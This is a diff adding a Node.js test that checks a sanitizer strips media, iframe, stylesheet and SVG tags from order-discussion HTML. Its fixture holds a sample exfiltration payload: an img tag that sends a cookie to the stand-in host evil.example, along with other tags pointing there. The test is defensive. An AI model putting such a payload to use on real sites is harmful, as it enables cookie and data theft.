@@ -2,6 +2,7 @@ import test from 'node:test';
 import assert from 'node:assert/strict';
 import {inspectOrderDiscussionDom,mergeDiscussionProbes}
   from '../vision/orders/discussion-probe.mjs';
+import {inertOrderDiscussionHtml} from '../vision/orders/order-page-discovery.mjs';
 
 function control(text,{scope='article',href='',title='',action='',isAgree=false}={}){
   return {
@@ -112,4 +113,24 @@ test('missing/malformed DOM never counts as evidence of defect-free artwork',()=
    assert.equal(x.controls_total,0);
    assert.equal(JSON.stringify(x).includes('private'),false);
  }
+});
+
+test('inert order-card parser strips media and stylesheet tags without opening private screenshot URLs',()=>{
+ const source='<div class="discussion-list"><div class="comment-item">'+
+   '<p class="comment-body">Пробел узкий</p>'+
+   '<a href="/attachments/secret.png"><img src="https://evil.example/log?cookie=private" alt="screenshot"></a>'+
+   '<iframe src="https://evil.example/iframe"></iframe>'+
+   '<link rel="stylesheet" href="https://evil.example/css">'+
+   '<svg><image href="https://evil.example/svg.png"/></svg></div></div>';
+ const sanitized=inertOrderDiscussionHtml(source);
+ assert.ok(sanitized.includes('data-vision-media-candidate'));
+ assert.ok(sanitized.includes('/attachments/secret.png'),'Links are inert references, not fetched');
+ assert.ok(!sanitized.includes('<img'));
+ assert.ok(!sanitized.includes('<iframe'));
+ assert.ok(!sanitized.includes('<link'));
+ assert.ok(!sanitized.includes('<image'));
+ assert.ok(!sanitized.includes('evil.example'));
+ assert.ok(sanitized.includes('Пробел узкий'));
+ assert.equal(inertOrderDiscussionHtml('<img src="unterminated'),null);
+ assert.equal(inertOrderDiscussionHtml(null),null);
 });
